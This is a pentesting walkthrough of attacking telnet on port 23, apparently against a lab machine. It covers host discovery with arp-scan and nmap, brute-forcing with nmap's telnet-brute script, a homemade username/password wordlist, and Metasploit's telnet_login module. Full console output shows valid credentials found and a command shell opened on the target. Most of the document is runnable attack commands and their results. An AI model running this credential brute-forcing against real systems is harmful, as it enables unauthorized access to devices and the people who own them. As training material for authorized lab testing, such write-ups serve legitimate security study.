*telnet

1. telnet is a network protocol that provides a command -line interface to communicate with a device remotely

2. in simple words we can say telnet is use to access device remotely from different location.

3. telnet is an application layer protocol which is use to remotely access network devices

4. telnet is work on protocol tcp & port # 23

5. first we need to configure telnet in network device then we can do telnet form different place.



Information gathering
-----------------------
- Check your server ip using below command

# arp-scan -l


Scanning
--------------

# nmap -p 23 192.168.0.101

# nmap -A 192.168.0.101


try to use NSE scripts
----------------------------

# locate .nse | grep telnet


How to use NSE scripts
--------------------------

First usage

# nmap --script telnet-brute 192.168.0.101


Second usage

# nmap --script=telnet-brute 192.168.0.101


third usage

# nmap --script=telnet-brute.nse 192.168.0.101


Results
------------
23/tcp   open  telnet
| telnet-brute: 
|   Accounts: 
|     user:user - Valid credentials
|_  Statistics: Performed 2914 guesses in 616 seconds, average tps: 4.8


- here we are getting valid user credentials. using this try to login.


Telnet login:
----------------
# telnet 192.168.0.101 23

- Username: user
- Password: user

- Valid user.


- Username: msfadmin
- Password: msfadmin

---------------------------------------------------------------------------------------

seclist file
--------------------
- first create user and pass list

- usernames
admin
user
hacker
ajay
icss
msfadmin
root
kali
pen



- passwords
password
user
msfadmin
toor
ajay
cracker
book
kali
pass123


# NOTE:save above credentials to user.txt & pass.txt



*using msf to exploit


# msfconsole
# search telnet login
# use auxiliary(scanner/telnet/telnet_login) or use 5
# show options
# set RHOSTS 192.168.0.101
# set USER_FILE /root/NetworkPentesting/telnet/user.txt
# set PASS_FILE /root/NetworkPentesting/telnet/pass.txt
# set STOP_ON_SUCCESS true
# exploit



- full POC:
---------------

msf6 > search telnet login

Matching Modules
================

   #  Name                                                              Disclosure Date  Rank       Check  Description
   -  ----                                                              ---------------  ----       -----  -----------
   0  auxiliary/scanner/telnet/brocade_enable_login                                      normal     No     Brocade Enable Login Check Scanner
   1  exploit/linux/http/huawei_hg532n_cmdinject                        2017-04-15       excellent  Yes    Huawei HG532n Command Injection
   2  auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass  2021-09-06       normal     Yes    Netgear PNPX_GetShareFolderList Authentication Bypass
   3  exploit/unix/misc/polycom_hdx_auth_bypass                         2013-01-18       normal     Yes    Polycom Command Shell Authorization Bypass
   4  exploit/solaris/telnet/ttyprompt                                  2002-01-18       excellent  No     Solaris in.telnetd TTYPROMPT Buffer Overflow
   5  auxiliary/scanner/telnet/telnet_login                                              normal     No     Telnet Login Check Scanner
   6  post/windows/gather/credentials/mremote                                            normal     No     Windows Gather mRemote Saved Password Extraction


Interact with a module by name or index. For example info 6, use 6 or use post/windows/gather/credentials/mremote                                                                                     

msf6 > use 5
msf6 auxiliary(scanner/telnet/telnet_login) > show options

Module options (auxiliary/scanner/telnet/telnet_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the curre
                                                nt database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the
                                                list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current d
                                                atabase (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.c
                                                om/docs/using-metasploit/basics/using-metasploit.
                                                html
   RPORT             23               yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per hos
                                                t)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by
                                                space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.0.101
RHOSTS => 192.168.0.101
msf6 auxiliary(scanner/telnet/telnet_login) > set USER_FILE /root/NetworkPentesting/telnet/user.txtUSER_FILE => /root/NetworkPentesting/telnet/user.txt
msf6 auxiliary(scanner/telnet/telnet_login) > set PASS_FILE /root/NetworkPentesting/telnet/pass.txtPASS_FILE => /root/NetworkPentesting/telnet/pass.txt
msf6 auxiliary(scanner/telnet/telnet_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/telnet/telnet_login) > exploit

[!] 192.168.0.101:23      - No active DB -- Credential data will not be saved!
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin:password (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin:user (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin:msfadmin (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin:toor (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin:ajay (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin:cracker (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin:book (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin:kali (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin:pass123 (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: admin: (Incorrect: )
[-] 192.168.0.101:23      - 192.168.0.101:23 - LOGIN FAILED: user:password (Incorrect: )
[+] 192.168.0.101:23      - 192.168.0.101:23 - Login Successful: user:user
[*] 192.168.0.101:23      - Attempting to start session 192.168.0.101:23 with user:user
[*] Command shell session 1 opened (192.168.0.114:36953 -> 192.168.0.101:23) at 2023-02-28 11:05:59 +0530
[*] 192.168.0.101:23      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed







